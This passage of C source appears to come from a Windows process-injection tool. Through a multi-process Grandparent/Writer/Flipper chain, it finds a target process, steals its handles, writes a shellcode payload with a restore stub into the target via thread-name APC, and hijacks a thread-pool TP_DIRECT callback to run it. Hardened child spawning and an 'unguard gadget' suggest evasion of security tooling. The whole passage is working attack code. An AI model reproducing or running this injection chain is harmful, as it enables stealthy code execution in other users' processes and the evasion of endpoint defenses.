    0x69, 0x53, 0x66, 0x49, 0x68, 0x6C, 0x6D, 0x4D, 0x4E, 0x76, 0x67, 0x7A, 0x4D, 0x4F, 0x7A, 0x61,
    0x65, 0x57, 0x59, 0x53, 0x44, 0x49, 0x4A, 0x76, 0x61, 0x6A, 0x6B, 0x70, 0x63, 0x71, 0x64, 0x51,
    0x6E, 0x4F, 0x64, 0x48, 0x64, 0x48, 0x63, 0x76, 0x65, 0x53, 0x63, 0x61, 0x78, 0x41, 0x64, 0x48,
    0x66, 0x69, 0x6B, 0x50, 0x6C, 0x6C, 0x6C, 0x45, 0x61, 0x54, 0x6C, 0x6A, 0x6A, 0x4D, 0x6A, 0x4B,
    0x6A, 0x49, 0x62, 0x65 
};


// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

#pragma region Role Entry Points	

//
// Grandparent runs all target discovery (process scan,
// handle theft, pool walks, RWX region sweep) and hands the chosen target
// to the Writer via a 13-slot argv + 3 inherited handles. 
//
static int GrandparentMain(IN LPCWSTR pwszSelfNtPath, IN LPCWSTR pwszSelfWin32Path)
{
    ULONG   uWrappedSize                    = 0x00;
    HANDLE  hInheritList[3]                 = { 0 };
    WCHAR   wszCommandLine[MAX_PATH * 2]    = { 0 };
    int     iExitCode                       = -1;

    // Size the scanner's RWX-reuse gate the same way the Writer will compose its
    // wrapped buffer: [restore stub + data slot][payload][8-byte Callback-patch value]
    uWrappedSize = (ULONG)sizeof(g_RestoreStubTemplate) + (ULONG)sizeof(x64CmdShellcode) + (ULONG)sizeof(ULONG_PTR);

    if (!FindTpInjectTargetProcess((SIZE_T)uWrappedSize))
    {
        DBG("[!] Grandparent: FindTpInjectTargetProcess Failed");
        goto _END_OF_FUNC;
    }

    DBG("[+] Grandparent: Target Process %ws (PID:%lu, TID:%lu, Kind=%s, Mode=%s)",
        g_tpInjectTarget.wszProcessName, g_tpInjectTarget.dwProcessId, g_tpInjectTarget.dwThreadId,
        (g_tpInjectTarget.TpObjectFound == TpObjectKindIo)   ? "TP_IO"   :
        (g_tpInjectTarget.TpObjectFound == TpObjectKindAlpc) ? "TP_ALPC" :
                                                               "TP_JOB",
        g_tpInjectTarget.bReusedRwx ? "REUSED-RWX" : "ALLOCATE");
    DBG("[+] Grandparent: TP_DIRECT=0x%p &TP_DIRECT.Callback=0x%p OriginalCallback=0x%p",
        g_tpInjectTarget.pTpDirectVA, g_tpInjectTarget.pTpDirectCallbackVA, g_tpInjectTarget.pOriginalCallback);

    //
    // Writer argv:
    //   argv[0]  = "<self>"
    //   argv[1]  = "writer"
    //   argv[2]  = dwProcessId         (Writer-side DBG + WinDbg attach pause)
    //   argv[3]  = dwThreadId          (Writer-side DBG)
    //   argv[4]  = hProcess            (inherited)
    //   argv[5]  = hThread             (inherited)
    //   argv[6]  = hIoCompletion       (inherited)
    //   argv[7]  = pTpDirectVA
    //   argv[8]  = pTpDirectCallbackVA
    //   argv[9]  = pOriginalCallback   (seed for the restore stub's data slot)
    //   argv[10] = TpObjectFound       (forwarded to Flipper for logging)
    //   argv[11] = bReusedRwx          (controls Writer alloc path + Flipper protect-flip)
    //   argv[12] = pReusedRwxBase      (destination when bReusedRwx; 0 otherwise)
    //
    // Writer runs in its own process, so its g_tpInjectTarget is a separate
    // instance. It repopulates it from these argv values on entry.
    //
    wsprintfW(wszCommandLine,
        L"\"%s\" writer 0x%X 0x%X 0x%p 0x%p 0x%p 0x%p 0x%p 0x%p 0x%X 0x%X 0x%p",
        pwszSelfWin32Path,
        g_tpInjectTarget.dwProcessId, g_tpInjectTarget.dwThreadId,
        g_tpInjectTarget.hProcess, g_tpInjectTarget.hThread, g_tpInjectTarget.hIoCompletion,
        g_tpInjectTarget.pTpDirectVA, g_tpInjectTarget.pTpDirectCallbackVA, g_tpInjectTarget.pOriginalCallback,
        (ULONG)g_tpInjectTarget.TpObjectFound, (ULONG)(g_tpInjectTarget.bReusedRwx ? 1 : 0),
        g_tpInjectTarget.pReusedRwxBase);

    hInheritList[0] = g_tpInjectTarget.hProcess;
    hInheritList[1] = g_tpInjectTarget.hThread;
    hInheritList[2] = g_tpInjectTarget.hIoCompletion;

    if (!SpawnChildProcess(pwszSelfNtPath, wszCommandLine, SPAWN_HARDENED_CHILDREN, hInheritList, 3))
    {
        DBG("[!] Grandparent: SpawnChildProcess Failed");
        goto _END_OF_FUNC;
    }

    DBG("[+] Grandparent: Spawned Writer Child Successfully");
    iExitCode = 0;

_END_OF_FUNC:
    // Target handles in g_tpInjectTarget were handed to Writer via inherit
    // list on success. On failure, Grandparent teardown reclaims them.
    return iExitCode;
}

//
// Writer repopulates g_tpInjectTarget from argv (no scan), composes the wrapped
// payload, writes it into the target via TNC (RWX reuse if Grandparent found a
// region, otherwise fresh allocation), and spawns the Flipper with the same
// inherited handles chained one level deeper.
//
static int WriterChildMain(IN int argc, IN WCHAR* argv[], IN LPCWSTR pwszSelfNtPath, IN LPCWSTR pwszSelfWin32Path)
{
    PVOID       pAllocatedAddress               = NULL;
    PBYTE       pWrappedPayload                 = NULL;
    ULONG       uWrappedSize                    = 0x00;
    ULONG_PTR   uShellcodeEntry                 = 0x00;
    HANDLE      hInheritList[3]                 = { 0 };
    WCHAR       wszCommandLine[MAX_PATH * 2]    = { 0 };
    int         iExitCode                       = -1;

    if (argc < 13)
    {
        DBG("[!] Writer: Expected 13 Arguments, Got %d", argc);
        return -1;
    }

    g_tpInjectTarget.dwProcessId         = (DWORD)                    wcstoul (argv[2],  NULL, 16);
    g_tpInjectTarget.dwThreadId          = (DWORD)                    wcstoul (argv[3],  NULL, 16);
    g_tpInjectTarget.hProcess            = (HANDLE)        (ULONG_PTR)wcstoull(argv[4],  NULL, 16);
    g_tpInjectTarget.hThread             = (HANDLE)        (ULONG_PTR)wcstoull(argv[5],  NULL, 16);
    g_tpInjectTarget.hIoCompletion       = (HANDLE)        (ULONG_PTR)wcstoull(argv[6],  NULL, 16);
    g_tpInjectTarget.pTpDirectVA         = (PVOID)         (ULONG_PTR)wcstoull(argv[7],  NULL, 16);
    g_tpInjectTarget.pTpDirectCallbackVA = (PVOID)         (ULONG_PTR)wcstoull(argv[8],  NULL, 16);
    g_tpInjectTarget.pOriginalCallback   = (PVOID)         (ULONG_PTR)wcstoull(argv[9],  NULL, 16);
    g_tpInjectTarget.TpObjectFound       = (TP_OBJECT_KIND)(ULONG)    wcstoul (argv[10], NULL, 16);
    g_tpInjectTarget.bReusedRwx          = (wcstoul(argv[11], NULL, 16) != 0) ? TRUE : FALSE;
    g_tpInjectTarget.pReusedRwxBase      = (PVOID)         (ULONG_PTR)wcstoull(argv[12], NULL, 16);

    DBG("[+] Writer: Inherited Target - PID:%lu TID:%lu hProcess=0x%p hThread=0x%p hIoCompletion=0x%p",
        g_tpInjectTarget.dwProcessId, g_tpInjectTarget.dwThreadId,
        g_tpInjectTarget.hProcess, g_tpInjectTarget.hThread, g_tpInjectTarget.hIoCompletion);
    DBG("[+] Writer: TP_DIRECT=0x%p &TP_DIRECT.Callback=0x%p OriginalCallback=0x%p Kind=%s Mode=%s",
        g_tpInjectTarget.pTpDirectVA, g_tpInjectTarget.pTpDirectCallbackVA, g_tpInjectTarget.pOriginalCallback,
        (g_tpInjectTarget.TpObjectFound == TpObjectKindIo)   ? "TP_IO"   :
        (g_tpInjectTarget.TpObjectFound == TpObjectKindAlpc) ? "TP_ALPC" :
                                                               "TP_JOB",
        g_tpInjectTarget.bReusedRwx ? "REUSED-RWX" : "ALLOCATE");

    // Wrapped buffer layout: [restore stub w/ data slot][payload][8-byte Callback-patch value]
    uWrappedSize = (ULONG)sizeof(g_RestoreStubTemplate) + (ULONG)sizeof(x64CmdShellcode) + (ULONG)sizeof(ULONG_PTR);

    if (!(pWrappedPayload = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, uWrappedSize)))
    {
        DBG("[!] HeapAlloc Failed With Error: %lu", GetLastError());
        goto _END_OF_FUNC;
    }

    // Emit the restore stub (seeds both data slots in one shot) and append the payload.
    EmitRestoreStub(pWrappedPayload, g_tpInjectTarget.pOriginalCallback, g_tpInjectTarget.pTpDirectCallbackVA);
    RtlCopyMemory(pWrappedPayload + sizeof(g_RestoreStubTemplate), x64CmdShellcode, sizeof(x64CmdShellcode));

    DBG("[+] Writer: Local Wrapped Buffer Composed (%lu stub + %lu payload + %lu Callback-patch = %lu bytes)",
        (ULONG)sizeof(g_RestoreStubTemplate), (ULONG)sizeof(x64CmdShellcode), (ULONG)sizeof(ULONG_PTR), uWrappedSize);
    DBG("[+] Writer: Data Slots Seeded - value=0x%p (OriginalCallback), addr=0x%p (&TP_DIRECT.Callback)",
        g_tpInjectTarget.pOriginalCallback, g_tpInjectTarget.pTpDirectCallbackVA);

    // Destination in the target: either the RWX region Grandparent found, or a fresh allocation.
    if (g_tpInjectTarget.bReusedRwx)
    {
        pAllocatedAddress = g_tpInjectTarget.pReusedRwxBase;
        DBG("[+] Writer: Reusing RWX Region @ 0x%p (handed down by Grandparent) - skipped NtAllocateVirtualMemory",
            pAllocatedAddress);
    }
    else
    {
        if (!(pAllocatedAddress = AllocateVirtualMemory(g_tpInjectTarget.hProcess, uWrappedSize, PAGE_READWRITE)))
        {
            DBG("[!] AllocateVirtualMemory Failed");
            goto _END_OF_FUNC;
        }
        DBG("[+] Writer: Target Allocation At 0x%p (%lu bytes, RW)", pAllocatedAddress, uWrappedSize);
    }

    uShellcodeEntry = (ULONG_PTR)pAllocatedAddress + RESTORE_STUB_ENTRY_OFFSET;
    *(ULONG_PTR*)(pWrappedPayload + sizeof(g_RestoreStubTemplate) + sizeof(x64CmdShellcode)) = uShellcodeEntry;

    DBG("[+] Writer: Shellcode Entry 0x%p Planted At Tail (Offset %lu)",
        (PVOID)uShellcodeEntry, (ULONG)(sizeof(g_RestoreStubTemplate) + sizeof(x64CmdShellcode)));

    if (!WriteMemoryViaThreadNameApc(g_tpInjectTarget.hProcess, g_tpInjectTarget.hThread, pAllocatedAddress, pWrappedPayload, uWrappedSize, FALSE))
    {
        DBG("[!] WriteMemoryViaThreadNameApc Failed");
        goto _END_OF_FUNC;
    }

    //
    // Flipper argv protocol - unchanged (10 slots after argv[0..1]):
    //   argv[2..4]  = hProcess, hThread, hIoCompletion    (chain-inherited)
    //   argv[5]     = pAllocatedAddress
    //   argv[6]     = uWrappedSize
    //   argv[7..8]  = pTpDirectVA, pTpDirectCallbackVA
    //   argv[9]     = MatchedKind
    //   argv[10]    = bReusedRwx
    //
    // Inherited handles retain HANDLE_FLAG_INHERIT, so they chain down through another
    // PROCESS_CREATE_FLAGS_INHERIT_HANDLES + PS_ATTRIBUTE_HANDLE_LIST without re-duplication.
    //
    wsprintfW(wszCommandLine, L"\"%s\" flipper 0x%p 0x%p 0x%p 0x%p 0x%X 0x%p 0x%p 0x%X 0x%X", pwszSelfWin32Path,
        g_tpInjectTarget.hProcess, g_tpInjectTarget.hThread, g_tpInjectTarget.hIoCompletion,
        pAllocatedAddress, uWrappedSize,
        g_tpInjectTarget.pTpDirectVA, g_tpInjectTarget.pTpDirectCallbackVA,
        (ULONG)g_tpInjectTarget.TpObjectFound, (ULONG)(g_tpInjectTarget.bReusedRwx ? 1 : 0));

    hInheritList[0] = g_tpInjectTarget.hProcess;
    hInheritList[1] = g_tpInjectTarget.hThread;
    hInheritList[2] = g_tpInjectTarget.hIoCompletion;

    if (!SpawnChildProcess(pwszSelfNtPath, wszCommandLine, SPAWN_HARDENED_CHILDREN, hInheritList, 3))
    {
        DBG("[!] SpawnChildProcess Failed");
        goto _END_OF_FUNC;
    }

    DBG("[+] Writer: Spawned Flipper Child Successfully");
    iExitCode = 0;

_END_OF_FUNC:
    if (pWrappedPayload)
        HeapFree(GetProcessHeap(), 0x00, pWrappedPayload);
    // Target handles handed to Flipper via inherit list on success; teardown reclaims on failure.
    return iExitCode;
}


//
// Flipper repopulates g_tpInjectTarget from argv and invokes HijackTpDirectCallback.
// All syscalls on the target happen here.
//
static int FlipperChildMain(IN int argc, IN WCHAR* argv[])
{
    PVOID   pAllocatedAddress   = NULL;
    SIZE_T  cbSize              = 0x00;
    int     iExitCode           = -1;

    if (argc < 11)
    {
        DBG("[!] Flipper: Expected 11 Arguments, Got %d", argc);
        return -1;
    }

    g_tpInjectTarget.hProcess            = (HANDLE)        (ULONG_PTR)wcstoull(argv[2],  NULL, 16);
    g_tpInjectTarget.hThread             = (HANDLE)        (ULONG_PTR)wcstoull(argv[3],  NULL, 16);
    g_tpInjectTarget.hIoCompletion       = (HANDLE)        (ULONG_PTR)wcstoull(argv[4],  NULL, 16);
    pAllocatedAddress                    = (PVOID)         (ULONG_PTR)wcstoull(argv[5],  NULL, 16);
    cbSize                               = (SIZE_T)                   wcstoull(argv[6],  NULL, 16);
    g_tpInjectTarget.pTpDirectVA         = (PVOID)         (ULONG_PTR)wcstoull(argv[7],  NULL, 16);
    g_tpInjectTarget.pTpDirectCallbackVA = (PVOID)         (ULONG_PTR)wcstoull(argv[8],  NULL, 16);
    g_tpInjectTarget.TpObjectFound       = (TP_OBJECT_KIND)(ULONG)    wcstoull(argv[9],  NULL, 16);
    g_tpInjectTarget.bReusedRwx          = (wcstoull(argv[10], NULL, 16) != 0) ? TRUE : FALSE;

    DBG("[+] Flipper: Inherited Handles - hProcess=0x%p hThread=0x%p hIoCompletion=0x%p",
        g_tpInjectTarget.hProcess, g_tpInjectTarget.hThread, g_tpInjectTarget.hIoCompletion);
    DBG("[+] Flipper: Target Layout - pAllocatedAddress=0x%p cbSize=%lu TP_DIRECT=0x%p &TP_DIRECT.Callback=0x%p Kind=%s Mode=%s",
        pAllocatedAddress, (ULONG)cbSize, g_tpInjectTarget.pTpDirectVA, g_tpInjectTarget.pTpDirectCallbackVA,
        (g_tpInjectTarget.TpObjectFound == TpObjectKindIo)   ? "TP_IO"   :
        (g_tpInjectTarget.TpObjectFound == TpObjectKindAlpc) ? "TP_ALPC" :
        (g_tpInjectTarget.TpObjectFound == TpObjectKindJob)  ? "TP_JOB"  :
                                                               "<unknown>",
        g_tpInjectTarget.bReusedRwx ? "REUSED-RWX" : "ALLOCATE");

    if (!HijackTpDirectCallback(pAllocatedAddress, cbSize))
    {
        DBG("[!] HijackTpDirectCallback Failed");
        goto _END_OF_FUNC;
    }

    DBG("[+] Flipper: Bye!");
    iExitCode = 0;

_END_OF_FUNC:
    return iExitCode;
}

#pragma endregion // Role Entry Points	

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

int wmain(int argc, WCHAR* argv[])
{
    HMODULE     hNtdll                              = NULL;
    WCHAR       wszSelfWin32Path[MAX_PATH]          = { 0 };
    WCHAR       wszSelfNtPath[MAX_PATH + 4]         = { 0 };
    int         iExitCode                           = -1;

    if (!(hNtdll = GetModuleHandle(TEXT("NTDLL"))))
    {
        DBG("[!] GetModuleHandle Failed With Error: %lu", GetLastError());
        goto _END_OF_FUNC;
    }

    if (!InitializeUnguardGadget(hNtdll, 0))
        goto _END_OF_FUNC;

    if (!InitializeFunctionsGlobal())
        goto _END_OF_FUNC;

    if (!GetModuleInfoFromHandle(NULL, NULL, wszSelfWin32Path))
    {
        DBG("[!] GetModuleInfoFromHandle Failed");
        goto _END_OF_FUNC;
    }
    wsprintfW(wszSelfNtPath, L"\\??\\%s", wszSelfWin32Path);

    // Role Dispatch
    if (argc == 1)
    {
        DBG("[+] Role: Grandparent");
        iExitCode = GrandparentMain(wszSelfNtPath, wszSelfWin32Path);
    }
    else if (argc >= 2 && lstrcmpiW(argv[1], L"writer") == 0)
    {
        DBG("[+] Role: Writer");
        iExitCode = WriterChildMain(argc, argv, wszSelfNtPath, wszSelfWin32Path);
    }
    else if (argc >= 2 && lstrcmpiW(argv[1], L"flipper") == 0)
    {
        DBG("[+] Role: Flipper");
        iExitCode = FlipperChildMain(argc, argv);
    }
    else
    {
        DBG("[!] Unknown Role: %ws", argv[1]);
    }

_END_OF_FUNC:
    return iExitCode;
}

